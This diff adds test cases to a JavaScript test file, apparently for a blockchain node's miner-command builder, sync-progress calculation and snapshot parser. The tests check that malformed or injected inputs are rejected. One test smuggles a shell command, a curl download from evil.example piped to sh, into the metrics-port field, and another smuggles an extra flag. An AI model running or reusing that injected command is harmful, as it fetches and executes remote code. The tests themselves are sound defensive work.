@@ -171,5 +171,52 @@ eq("snapshot missing fetched_at", parseSnapshot({ head: 194626 }, NOW), null);
 eq("snapshot null payload", parseSnapshot(null, NOW), null);
 eq("snapshot non-object payload", parseSnapshot("194626", NOW), null);
 
+/* --- round 2: miner-command injection + count grammar --- */
+r = buildNodeCommand({ name: "ops-01", mode: "external", innerHash: IH,
+  miner: { metricsPort: 9900, cpuWorkers: 4, gpuDevices: 2 } });
+ok("miner metrics port ok", r.minerCmd.includes("--metrics-port 9900"));
+ok("miner cpu workers ok", r.minerCmd.includes("--cpu-workers 4"));
+ok("miner gpu devices ok", r.minerCmd.includes("--gpu-devices 2"));
+r = buildNodeCommand({ name: "ops-01", mode: "external", innerHash: IH,
+  miner: { metricsPort: "9900; curl https://evil.example/x|sh" } });
+eq("miner metrics injection blocks miner cmd", r.minerCmd, null);
+ok("miner metrics injection errors", r.errors.some(e => e.includes("Miner metrics port")));
+r = buildNodeCommand({ name: "ops-01", mode: "external", innerHash: IH,
+  miner: { metricsPort: "9900 --cuda-gpu" } });
+eq("miner metrics flag smuggling blocks", r.minerCmd, null);
+r = buildNodeCommand({ name: "ops-01", mode: "external", innerHash: IH, miner: { metricsPort: 80 } });
+eq("miner metrics privileged blocks", r.minerCmd, null);
+r = buildNodeCommand({ name: "ops-01", mode: "external", innerHash: IH, miner: { metricsPort: 70000 } });
+eq("miner metrics over-range blocks", r.minerCmd, null);
+r = buildNodeCommand({ name: "ops-01", mode: "external", innerHash: IH, miner: { metricsPort: 9900.5 } });
+eq("miner metrics float blocks", r.minerCmd, null);
+r = buildNodeCommand({ name: "ops-01", mode: "external", innerHash: IH, miner: { cpuWorkers: "four" } });
+eq("miner cpu prose blocks (no NaN painted)", r.minerCmd, null);
+ok("miner cpu prose errors", r.errors.some(e => e.includes("CPU workers")));
+r = buildNodeCommand({ name: "ops-01", mode: "external", innerHash: IH, miner: { cpuWorkers: -2 } });
+eq("miner cpu negative blocks (no silent clamp to 1)", r.minerCmd, null);
+r = buildNodeCommand({ name: "ops-01", mode: "external", innerHash: IH, miner: { gpuDevices: {} } });
+eq("miner gpu object blocks", r.minerCmd, null);
+r = buildNodeCommand({ name: "ops-01", mode: "external", innerHash: IH, miner: { cpuWorkers: "8" } });
+ok("miner cpu digit string ok", r.minerCmd.includes("--cpu-workers 8"));
+
+/* --- round 2: sync relations --- */
+eq("sync fractional local", syncProgress(142000.5, 142417), null);
+eq("sync fractional network", syncProgress(142000, 142417.5), null);
+eq("sync local ahead of network", syncProgress(142500, 142417), null);
+eq("sync over-ceiling", syncProgress(99999999999, 100000000000), null);
+eq("sync scientific string", syncProgress("1.42e5", 142417), null);
+eq("sync float string", syncProgress("142000.5", 142417), null);
+s = syncProgress("142000", "142417");
+eq("sync digit strings behind", s.behind, 417);
+s = syncProgress(0, 142417);
+eq("sync genesis local behind", s.behind, 142417);
+
+/* --- round 2: snapshot head ceiling --- */
+eq("snapshot head at ceiling ok", parseSnapshot({ head: 10000000, fetched_at: GOOD.fetched_at }, NOW).head, 10000000);
+eq("snapshot head over ceiling", parseSnapshot({ head: 10000001, fetched_at: GOOD.fetched_at }, NOW), null);
+eq("snapshot head absurd", parseSnapshot({ head: 999999999999, fetched_at: GOOD.fetched_at }, NOW), null);
+eq("snapshot digit-string head over ceiling", parseSnapshot({ head: "999999999999", fetched_at: GOOD.fetched_at }, NOW), null);
+
 console.log(`\n${pass} passed, ${fail} failed`);
 process.exit(fail ? 1 : 0);
